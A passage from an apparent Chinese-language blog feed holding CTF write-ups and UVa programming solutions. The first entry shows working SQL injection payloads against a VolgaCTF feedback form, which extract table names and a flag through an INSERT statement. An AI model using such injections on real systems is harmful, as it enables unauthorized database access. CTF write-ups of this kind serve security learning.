<p>發送一般的request後，status會顯示<code>not processed</code><br>POST: <code>name=a&amp;email=b&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/original.png" alt="normal request" title="normal request"></p>
<p>試了一下，在email欄插入<code>&#39;</code>就會造成error，還可以看到各個input欄位分別是甚麼。<br>POST: <code>name=a&amp;email=b&#39;&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/single_quotation.png" alt="with single quotation" title="with single quotation"></p>
<p>從上面可以分析出來該sql語句應該是<br><code>INSERT INTO … VALUE($code, $name, $message, $email, &#39;not processed&#39;)</code><br>所以只要把最後的<code>not processed</code>部分改插我們想要的東西，再來把後面註解掉，就會顯示出來了！<br>POST: <code>name=a&amp;email=b&#39;, &#39;Hello World!&#39;) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/arbitrary_text.png" alt="show arbitrary text" title="show arbitrary text"></p>
<p>成功了！先拿table<br>POST: <code>name=a&amp;email=b&#39;, (Select table_name from information_schema.tables limit 1 offset 1)) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/table.png" alt="show table" title="show table"></p>
<p>最後拿flag<br>POST: <code>name=a&amp;email=b&#39;, (SELECT * FROM s3cret_tabl3 limit 1 offset 4)) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/flag.png" alt="get flag" title="get flag"><br>Flag: <code>VolgaCTF{eiU7UJhyeu@ud3*}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Web&lt;br&gt;Point: 100&lt;br&gt;Description: Send your feedback at &lt;a href=&quot;http://bloody-feedback.quals.2017.volgactf.ru&quot;&gt;bloody-feedback.quals.2017.volgactf.ru&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - VC 50</title>
    <link href="https://andyw330.github.io/2017/03/30/VolgaCTF-2017-Quals-VC-50/"/>
    <id>https://andyw330.github.io/2017/03/30/VolgaCTF-2017-Quals-VC-50/</id>
    <published>2017-03-30T09:47:00.000Z</published>
    <updated>2017-03-31T06:04:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Crypto<br>Point: 50<br>Description: There are files A.png and B.png. But where’s the flag?</p>
</blockquote>
<a id="more"></a>
<p>題目給的兩個 png 檔案：</p>
<img src="/2017/03/30/VolgaCTF-2017-Quals-VC-50/A.png" alt="A.png" title="A.png">
<img src="/2017/03/30/VolgaCTF-2017-Quals-VC-50/B.png" alt="B.png" title="B.png">
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>方法很多，用<code>ImageMagick</code>的<code>compare</code>或是用<code>python PIL</code>都可以解，我是用前者解的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">compare -compose src A.png B.png output.png</div></pre></td></tr></table></figure></p>
<p>然後就會得到下面這張圖：</p>
<img src="/2017/03/30/VolgaCTF-2017-Quals-VC-50/output.png" alt="compare output image" title="compare output image">
<p>Flag: <code>VolgaCTF{Classic_secret_sharing_scheme}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Crypto&lt;br&gt;Point: 50&lt;br&gt;Description: There are files A.png and B.png. But where’s the flag?&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Crypto" scheme="https://andyw330.github.io/tags/Crypto/"/>
    
      <category term="Visual Cryptography" scheme="https://andyw330.github.io/tags/Visual-Cryptography/"/>
    
  </entry>
  
  <entry>
    <title>UVa 11559 - Event Planning</title>
    <link href="https://andyw330.github.io/2017/03/13/UVa-11559-Event-Planning/"/>
    <id>https://andyw330.github.io/2017/03/13/UVa-11559-Event-Planning/</id>
    <published>2017-03-12T16:50:00.000Z</published>
    <updated>2017-03-30T16:27:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>題目連結：<a href="https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=24&amp;page=show_problem&amp;problem=2595" target="_blank" rel="external">UVa 11559 - Event Planning</a><br><a id="more"></a></p>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>時間複雜度O(hw)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> n, b, h, w, p, a, cost, i;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>, &amp;n, &amp;b, &amp;h, &amp;w) &gt; <span class="number">0</span>) &#123;</div><div class="line">        cost = <span class="number">1e9</span>;</div><div class="line">        <span class="keyword">while</span> (h--) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p);</div><div class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; w; ++i) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</div><div class="line">                <span class="keyword">if</span> (a &gt;= n &amp;&amp; b &gt;= n * p &amp;&amp; cost &gt; n * p)</div><div class="line">                    cost = n * p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (cost == <span class="number">1e9</span>)</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"stay home"</span>);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, cost);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;題目連結：&lt;a href=&quot;https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;amp;Itemid=8&amp;amp;category=24&amp;amp;page=show_problem&amp;amp;problem=2595&quot;&gt;UVa 11559 - Event Planning&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Online Judge" scheme="https://andyw330.github.io/categories/Online-Judge/"/>
    
    
      <category term="UVa" scheme="https://andyw330.github.io/tags/UVa/"/>
    
  </entry>
  
  <entry>
    <title>UVa 579 - Clock Hands</title>
    <link href="https://andyw330.github.io/2017/03/12/UVa-579-Clock-Hands/"/>
    <id>https://andyw330.github.io/2017/03/12/UVa-579-Clock-Hands/</id>
    <published>2017-03-12T13:53:00.000Z</published>
    <updated>2017-03-30T16:27:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>題目連結：<a href="https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=24&amp;page=show_problem&amp;problem=520" target="_blank" rel="external">UVa 579 - Clock Hands</a></p>
<h1 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h1><p>直接算角度相減，輸出小於等於180度角的部分 (0.030s)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> h, m;</div><div class="line">    <span class="keyword">float</span> ang1, ang2, ans;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d:%d"</span>, &amp;h, &amp;m), h || m) &#123;</div><div class="line">        ang1 = h * <span class="number">30</span> + m * <span class="number">0.5</span>;</div><div class="line">        ang2 = m * <span class="number">6</span>;</div><div class="line">        ans = <span class="built_in">fabs</span>(ang1 - ang2);</div><div class="line">        <span class="keyword">if</span> (ans &gt; <span class="number">180</span>)</div><div class="line">            ans = <span class="number">360</span> - ans;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%.3f\n"</span>, ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h1><p>直接建table做查找 (0.000s)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> table[<span class="number">13</span>][<span class="number">60</span>][<span class="number">8</span>] = &#123;</div><div class="line">    &#123;<span class="string">"0.000"</span>, <span class="string">"5.500"</span>, <span class="string">"11.000"</span>, <span class="string">"16.500"</span>, <span class="string">"22.000"</span>, <span class="string">"27.500"</span>, <span class="string">"33.000"</span>, <span class="string">"38.500"</span>, <span class="string">"44.000"</span>, <span class="string">"49.500"</span>, <span class="string">"55.000"</span>, <span class="string">"60.500"</span>, <span class="string">"66.000"</span>, <span class="string">"71.500"</span>, <span class="string">"77.000"</span>, <span class="string">"82.500"</span>, <span class="string">"88.000"</span>, <span class="string">"93.500"</span>, <span class="string">"99.000"</span>, <span class="string">"104.500"</span>, <span class="string">"110.000"</span>, <span class="string">"115.500"</span>, <span class="string">"121.000"</span>, <span class="string">"126.500"</span>, <span class="string">"132.000"</span>, <span class="string">"137.500"</span>, <span class="string">"143.000"</span>, <span class="string">"148.500"</span>, <span class="string">"154.000"</span>, <span class="string">"159.500"</span>, <span class="string">"165.000"</span>, <span class="string">"170.500"</span>, <span class="string">"176.000"</span>, <span class="string">"178.500"</span>, <span class="string">"173.000"</span>, <span class="string">"167.500"</span>, <span class="string">"162.000"</span>, <span class="string">"156.500"</span>, <span class="string">"151.000"</span>, <span class="string">"145.500"</span>, <span class="string">"140.000"</span>, <span class="string">"134.500"</span>, <span class="string">"129.000"</span>, <span class="string">"123.500"</span>, <span class="string">"118.000"</span>, <span class="string">"112.500"</span>, <span class="string">"107.000"</span>, <span class="string">"101.500"</span>, <span class="string">"96.000"</span>, <span class="string">"90.500"</span>, <span class="string">"85.000"</span>, <span class="string">"79.500"</span>, <span class="string">"74.000"</span>, <span class="string">"68.500"</span>, <span class="string">"63.000"</span>, <span class="string">"57.500"</span>, <span class="string">"52.000"</span>, <span class="string">"46.500"</span>, <span class="string">"41.000"</span>, <span class="string">"35.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"30.000"</span>, <span class="string">"24.500"</span>, <span class="string">"19.000"</span>, <span class="string">"13.500"</span>, <span class="string">"8.000"</span>, <span class="string">"2.500"</span>, <span class="string">"3.000"</span>, <span class="string">"8.500"</span>, <span class="string">"14.000"</span>, <span class="string">"19.500"</span>, <span class="string">"25.000"</span>, <span class="string">"30.500"</span>, <span class="string">"36.000"</span>, <span class="string">"41.500"</span>, <span class="string">"47.000"</span>, <span class="string">"52.500"</span>, <span class="string">"58.000"</span>, <span class="string">"63.500"</span>, <span class="string">"69.000"</span>, <span class="string">"74.500"</span>, <span class="string">"80.000"</span>, <span class="string">"85.500"</span>, <span class="string">"91.000"</span>, <span class="string">"96.500"</span>, <span class="string">"102.000"</span>, <span class="string">"107.500"</span>, <span class="string">"113.000"</span>, <span class="string">"118.500"</span>, <span class="string">"124.000"</span>, <span class="string">"129.500"</span>, <span class="string">"135.000"</span>, <span class="string">"140.500"</span>, <span class="string">"146.000"</span>, <span class="string">"151.500"</span>, <span class="string">"157.000"</span>, <span class="string">"162.500"</span>, <span class="string">"168.000"</span>, <span class="string">"173.500"</span>, <span class="string">"179.000"</span>, <span class="string">"175.500"</span>, <span class="string">"170.000"</span>, <span class="string">"164.500"</span>, <span class="string">"159.000"</span>, <span class="string">"153.500"</span>, <span class="string">"148.000"</span>, <span class="string">"142.500"</span>, <span class="string">"137.000"</span>, <span class="string">"131.500"</span>, <span class="string">"126.000"</span>, <span class="string">"120.500"</span>, <span class="string">"115.000"</span>, <span class="string">"109.500"</span>, <span class="string">"104.000"</span>, <span class="string">"98.500"</span>, <span class="string">"93.000"</span>, <span class="string">"87.500"</span>, <span class="string">"82.000"</span>, <span class="string">"76.500"</span>, <span class="string">"71.000"</span>, <span class="string">"65.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"60.000"</span>, <span class="string">"54.500"</span>, <span class="string">"49.000"</span>, <span class="string">"43.500"</span>, <span class="string">"38.000"</span>, <span class="string">"32.500"</span>, <span class="string">"27.000"</span>, <span class="string">"21.500"</span>, <span class="string">"16.000"</span>, <span class="string">"10.500"</span>, <span class="string">"5.000"</span>, <span class="string">"0.500"</span>, <span class="string">"6.000"</span>, <span class="string">"11.500"</span>, <span class="string">"17.000"</span>, <span class="string">"22.500"</span>, <span class="string">"28.000"</span>, <span class="string">"33.500"</span>, <span class="string">"39.000"</span>, <span class="string">"44.500"</span>, <span class="string">"50.000"</span>, <span class="string">"55.500"</span>, <span class="string">"61.000"</span>, <span class="string">"66.500"</span>, <span class="string">"72.000"</span>, <span class="string">"77.500"</span>, <span class="string">"83.000"</span>, <span class="string">"88.500"</span>, <span class="string">"94.000"</span>, <span class="string">"99.500"</span>, <span class="string">"105.000"</span>, <span class="string">"110.500"</span>, <span class="string">"116.000"</span>, <span class="string">"121.500"</span>, <span class="string">"127.000"</span>, <span class="string">"132.500"</span>, <span class="string">"138.000"</span>, <span class="string">"143.500"</span>, <span class="string">"149.000"</span>, <span class="string">"154.500"</span>, <span class="string">"160.000"</span>, <span class="string">"165.500"</span>, <span class="string">"171.000"</span>, <span class="string">"176.500"</span>, <span class="string">"178.000"</span>, <span class="string">"172.500"</span>, <span class="string">"167.000"</span>, <span class="string">"161.500"</span>, <span class="string">"156.000"</span>, <span class="string">"150.500"</span>, <span class="string">"145.000"</span>, <span class="string">"139.500"</span>, <span class="string">"134.000"</span>, <span class="string">"128.500"</span>, <span class="string">"123.000"</span>, <span class="string">"117.500"</span>, <span class="string">"112.000"</span>, <span class="string">"106.500"</span>, <span class="string">"101.000"</span>, <span class="string">"95.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"90.000"</span>, <span class="string">"84.500"</span>, <span class="string">"79.000"</span>, <span class="string">"73.500"</span>, <span class="string">"68.000"</span>, <span class="string">"62.500"</span>, <span class="string">"57.000"</span>, <span class="string">"51.500"</span>, <span class="string">"46.000"</span>, <span class="string">"40.500"</span>, <span class="string">"35.000"</span>, <span class="string">"29.500"</span>, <span class="string">"24.000"</span>, <span class="string">"18.500"</span>, <span class="string">"13.000"</span>, <span class="string">"7.500"</span>, <span class="string">"2.000"</span>, <span class="string">"3.500"</span>, <span class="string">"9.000"</span>, <span class="string">"14.500"</span>, <span class="string">"20.000"</span>, <span class="string">"25.500"</span>, <span class="string">"31.000"</span>, <span class="string">"36.500"</span>, <span class="string">"42.000"</span>, <span class="string">"47.500"</span>, <span class="string">"53.000"</span>, <span class="string">"58.500"</span>, <span class="string">"64.000"</span>, <span class="string">"69.500"</span>, <span class="string">"75.000"</span>, <span class="string">"80.500"</span>, <span class="string">"86.000"</span>, <span class="string">"91.500"</span>, <span class="string">"97.000"</span>, <span class="string">"102.500"</span>, <span class="string">"108.000"</span>, <span class="string">"113.500"</span>, <span class="string">"119.000"</span>, <span class="string">"124.500"</span>, <span class="string">"130.000"</span>, <span class="string">"135.500"</span>, <span class="string">"141.000"</span>, <span class="string">"146.500"</span>, <span class="string">"152.000"</span>, <span class="string">"157.500"</span>, <span class="string">"163.000"</span>, <span class="string">"168.500"</span>, <span class="string">"174.000"</span>, <span class="string">"179.500"</span>, <span class="string">"175.000"</span>, <span class="string">"169.500"</span>, <span class="string">"164.000"</span>, <span class="string">"158.500"</span>, <span class="string">"153.000"</span>, <span class="string">"147.500"</span>, <span class="string">"142.000"</span>, <span class="string">"136.500"</span>, <span class="string">"131.000"</span>, <span class="string">"125.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"120.000"</span>, <span class="string">"114.500"</span>, <span class="string">"109.000"</span>, <span class="string">"103.500"</span>, <span class="string">"98.000"</span>, <span class="string">"92.500"</span>, <span class="string">"87.000"</span>, <span class="string">"81.500"</span>, <span class="string">"76.000"</span>, <span class="string">"70.500"</span>, <span class="string">"65.000"</span>, <span class="string">"59.500"</span>, <span class="string">"54.000"</span>, <span class="string">"48.500"</span>, <span class="string">"43.000"</span>, <span class="string">"37.500"</span>, <span class="string">"32.000"</span>, <span class="string">"26.500"</span>, <span class="string">"21.000"</span>, <span class="string">"15.500"</span>, <span class="string">"10.000"</span>, <span class="string">"4.500"</span>, <span class="string">"1.000"</span>, <span class="string">"6.500"</span>, <span class="string">"12.000"</span>, <span class="string">"17.500"</span>, <span class="string">"23.000"</span>, <span class="string">"28.500"</span>, <span class="string">"34.000"</span>, <span class="string">"39.500"</span>, <span class="string">"45.000"</span>, <span class="string">"50.500"</span>, <span class="string">"56.000"</span>, <span class="string">"61.500"</span>, <span class="string">"67.000"</span>, <span class="string">"72.500"</span>, <span class="string">"78.000"</span>, <span class="string">"83.500"</span>, <span class="string">"89.000"</span>, <span class="string">"94.500"</span>, <span class="string">"100.000"</span>, <span class="string">"105.500"</span>, <span class="string">"111.000"</span>, <span class="string">"116.500"</span>, <span class="string">"122.000"</span>, <span class="string">"127.500"</span>, <span class="string">"133.000"</span>, <span class="string">"138.500"</span>, <span class="string">"144.000"</span>, <span class="string">"149.500"</span>, <span class="string">"155.000"</span>, <span class="string">"160.500"</span>, <span class="string">"166.000"</span>, <span class="string">"171.500"</span>, <span class="string">"177.000"</span>, <span class="string">"177.500"</span>, <span class="string">"172.000"</span>, <span class="string">"166.500"</span>, <span class="string">"161.000"</span>, <span class="string">"155.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"150.000"</span>, <span class="string">"144.500"</span>, <span class="string">"139.000"</span>, <span class="string">"133.500"</span>, <span class="string">"128.000"</span>, <span class="string">"122.500"</span>, <span class="string">"117.000"</span>, <span class="string">"111.500"</span>, <span class="string">"106.000"</span>, <span class="string">"100.500"</span>, <span class="string">"95.000"</span>, <span class="string">"89.500"</span>, <span class="string">"84.000"</span>, <span class="string">"78.500"</span>, <span class="string">"73.000"</span>, <span class="string">"67.500"</span>, <span class="string">"62.000"</span>, <span class="string">"56.500"</span>, <span class="string">"51.000"</span>, <span class="string">"45.500"</span>, <span class="string">"40.000"</span>, <span class="string">"34.500"</span>, <span class="string">"29.000"</span>, <span class="string">"23.500"</span>, <span class="string">"18.000"</span>, <span class="string">"12.500"</span>, <span class="string">"7.000"</span>, <span class="string">"1.500"</span>, <span class="string">"4.000"</span>, <span class="string">"9.500"</span>, <span class="string">"15.000"</span>, <span class="string">"20.500"</span>, <span class="string">"26.000"</span>, <span class="string">"31.500"</span>, <span class="string">"37.000"</span>, <span class="string">"42.500"</span>, <span class="string">"48.000"</span>, <span class="string">"53.500"</span>, <span class="string">"59.000"</span>, <span class="string">"64.500"</span>, <span class="string">"70.000"</span>, <span class="string">"75.500"</span>, <span class="string">"81.000"</span>, <span class="string">"86.500"</span>, <span class="string">"92.000"</span>, <span class="string">"97.500"</span>, <span class="string">"103.000"</span>, <span class="string">"108.500"</span>, <span class="string">"114.000"</span>, <span class="string">"119.500"</span>, <span class="string">"125.000"</span>, <span class="string">"130.500"</span>, <span class="string">"136.000"</span>, <span class="string">"141.500"</span>, <span class="string">"147.000"</span>, <span class="string">"152.500"</span>, <span class="string">"158.000"</span>, <span class="string">"163.500"</span>, <span class="string">"169.000"</span>, <span class="string">"174.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"180.000"</span>, <span class="string">"174.500"</span>, <span class="string">"169.000"</span>, <span class="string">"163.500"</span>, <span class="string">"158.000"</span>, <span class="string">"152.500"</span>, <span class="string">"147.000"</span>, <span class="string">"141.500"</span>, <span class="string">"136.000"</span>, <span class="string">"130.500"</span>, <span class="string">"125.000"</span>, <span class="string">"119.500"</span>, <span class="string">"114.000"</span>, <span class="string">"108.500"</span>, <span class="string">"103.000"</span>, <span class="string">"97.500"</span>, <span class="string">"92.000"</span>, <span class="string">"86.500"</span>, <span class="string">"81.000"</span>, <span class="string">"75.500"</span>, <span class="string">"70.000"</span>, <span class="string">"64.500"</span>, <span class="string">"59.000"</span>, <span class="string">"53.500"</span>, <span class="string">"48.000"</span>, <span class="string">"42.500"</span>, <span class="string">"37.000"</span>, <span class="string">"31.500"</span>, <span class="string">"26.000"</span>, <span class="string">"20.500"</span>, <span class="string">"15.000"</span>, <span class="string">"9.500"</span>, <span class="string">"4.000"</span>, <span class="string">"1.500"</span>, <span class="string">"7.000"</span>, <span class="string">"12.500"</span>, <span class="string">"18.000"</span>, <span class="string">"23.500"</span>, <span class="string">"29.000"</span>, <span class="string">"34.500"</span>, <span class="string">"40.000"</span>, <span class="string">"45.500"</span>, <span class="string">"51.000"</span>, <span class="string">"56.500"</span>, <span class="string">"62.000"</span>, <span class="string">"67.500"</span>, <span class="string">"73.000"</span>, <span class="string">"78.500"</span>, <span class="string">"84.000"</span>, <span class="string">"89.500"</span>, <span class="string">"95.000"</span>, <span class="string">"100.500"</span>, <span class="string">"106.000"</span>, <span class="string">"111.500"</span>, <span class="string">"117.000"</span>, <span class="string">"122.500"</span>, <span class="string">"128.000"</span>, <span class="string">"133.500"</span>, <span class="string">"139.000"</span>, <span class="string">"144.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"150.000"</span>, <span class="string">"155.500"</span>, <span class="string">"161.000"</span>, <span class="string">"166.500"</span>, <span class="string">"172.000"</span>, <span class="string">"177.500"</span>, <span class="string">"177.000"</span>, <span class="string">"171.500"</span>, <span class="string">"166.000"</span>, <span class="string">"160.500"</span>, <span class="string">"155.000"</span>, <span class="string">"149.500"</span>, <span class="string">"144.000"</span>, <span class="string">"138.500"</span>, <span class="string">"133.000"</span>, <span class="string">"127.500"</span>, <span class="string">"122.000"</span>, <span class="string">"116.500"</span>, <span class="string">"111.000"</span>, <span class="string">"105.500"</span>, <span class="string">"100.000"</span>, <span class="string">"94.500"</span>, <span class="string">"89.000"</span>, <span class="string">"83.500"</span>, <span class="string">"78.000"</span>, <span class="string">"72.500"</span>, <span class="string">"67.000"</span>, <span class="string">"61.500"</span>, <span class="string">"56.000"</span>, <span class="string">"50.500"</span>, <span class="string">"45.000"</span>, <span class="string">"39.500"</span>, <span class="string">"34.000"</span>, <span class="string">"28.500"</span>, <span class="string">"23.000"</span>, <span class="string">"17.500"</span>, <span class="string">"12.000"</span>, <span class="string">"6.500"</span>, <span class="string">"1.000"</span>, <span class="string">"4.500"</span>, <span class="string">"10.000"</span>, <span class="string">"15.500"</span>, <span class="string">"21.000"</span>, <span class="string">"26.500"</span>, <span class="string">"32.000"</span>, <span class="string">"37.500"</span>, <span class="string">"43.000"</span>, <span class="string">"48.500"</span>, <span class="string">"54.000"</span>, <span class="string">"59.500"</span>, <span class="string">"65.000"</span>, <span class="string">"70.500"</span>, <span class="string">"76.000"</span>, <span class="string">"81.500"</span>, <span class="string">"87.000"</span>, <span class="string">"92.500"</span>, <span class="string">"98.000"</span>, <span class="string">"103.500"</span>, <span class="string">"109.000"</span>, <span class="string">"114.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"120.000"</span>, <span class="string">"125.500"</span>, <span class="string">"131.000"</span>, <span class="string">"136.500"</span>, <span class="string">"142.000"</span>, <span class="string">"147.500"</span>, <span class="string">"153.000"</span>, <span class="string">"158.500"</span>, <span class="string">"164.000"</span>, <span class="string">"169.500"</span>, <span class="string">"175.000"</span>, <span class="string">"179.500"</span>, <span class="string">"174.000"</span>, <span class="string">"168.500"</span>, <span class="string">"163.000"</span>, <span class="string">"157.500"</span>, <span class="string">"152.000"</span>, <span class="string">"146.500"</span>, <span class="string">"141.000"</span>, <span class="string">"135.500"</span>, <span class="string">"130.000"</span>, <span class="string">"124.500"</span>, <span class="string">"119.000"</span>, <span class="string">"113.500"</span>, <span class="string">"108.000"</span>, <span class="string">"102.500"</span>, <span class="string">"97.000"</span>, <span class="string">"91.500"</span>, <span class="string">"86.000"</span>, <span class="string">"80.500"</span>, <span class="string">"75.000"</span>, <span class="string">"69.500"</span>, <span class="string">"64.000"</span>, <span class="string">"58.500"</span>, <span class="string">"53.000"</span>, <span class="string">"47.500"</span>, <span class="string">"42.000"</span>, <span class="string">"36.500"</span>, <span class="string">"31.000"</span>, <span class="string">"25.500"</span>, <span class="string">"20.000"</span>, <span class="string">"14.500"</span>, <span class="string">"9.000"</span>, <span class="string">"3.500"</span>, <span class="string">"2.000"</span>, <span class="string">"7.500"</span>, <span class="string">"13.000"</span>, <span class="string">"18.500"</span>, <span class="string">"24.000"</span>, <span class="string">"29.500"</span>, <span class="string">"35.000"</span>, <span class="string">"40.500"</span>, <span class="string">"46.000"</span>, <span class="string">"51.500"</span>, <span class="string">"57.000"</span>, <span class="string">"62.500"</span>, <span class="string">"68.000"</span>, <span class="string">"73.500"</span>, <span class="string">"79.000"</span>, <span class="string">"84.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"90.000"</span>, <span class="string">"95.500"</span>, <span class="string">"101.000"</span>, <span class="string">"106.500"</span>, <span class="string">"112.000"</span>, <span class="string">"117.500"</span>, <span class="string">"123.000"</span>, <span class="string">"128.500"</span>, <span class="string">"134.000"</span>, <span class="string">"139.500"</span>, <span class="string">"145.000"</span>, <span class="string">"150.500"</span>, <span class="string">"156.000"</span>, <span class="string">"161.500"</span>, <span class="string">"167.000"</span>, <span class="string">"172.500"</span>, <span class="string">"178.000"</span>, <span class="string">"176.500"</span>, <span class="string">"171.000"</span>, <span class="string">"165.500"</span>, <span class="string">"160.000"</span>, <span class="string">"154.500"</span>, <span class="string">"149.000"</span>, <span class="string">"143.500"</span>, <span class="string">"138.000"</span>, <span class="string">"132.500"</span>, <span class="string">"127.000"</span>, <span class="string">"121.500"</span>, <span class="string">"116.000"</span>, <span class="string">"110.500"</span>, <span class="string">"105.000"</span>, <span class="string">"99.500"</span>, <span class="string">"94.000"</span>, <span class="string">"88.500"</span>, <span class="string">"83.000"</span>, <span class="string">"77.500"</span>, <span class="string">"72.000"</span>, <span class="string">"66.500"</span>, <span class="string">"61.000"</span>, <span class="string">"55.500"</span>, <span class="string">"50.000"</span>, <span class="string">"44.500"</span>, <span class="string">"39.000"</span>, <span class="string">"33.500"</span>, <span class="string">"28.000"</span>, <span class="string">"22.500"</span>, <span class="string">"17.000"</span>, <span class="string">"11.500"</span>, <span class="string">"6.000"</span>, <span class="string">"0.500"</span>, <span class="string">"5.000"</span>, <span class="string">"10.500"</span>, <span class="string">"16.000"</span>, <span class="string">"21.500"</span>, <span class="string">"27.000"</span>, <span class="string">"32.500"</span>, <span class="string">"38.000"</span>, <span class="string">"43.500"</span>, <span class="string">"49.000"</span>, <span class="string">"54.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"60.000"</span>, <span class="string">"65.500"</span>, <span class="string">"71.000"</span>, <span class="string">"76.500"</span>, <span class="string">"82.000"</span>, <span class="string">"87.500"</span>, <span class="string">"93.000"</span>, <span class="string">"98.500"</span>, <span class="string">"104.000"</span>, <span class="string">"109.500"</span>, <span class="string">"115.000"</span>, <span class="string">"120.500"</span>, <span class="string">"126.000"</span>, <span 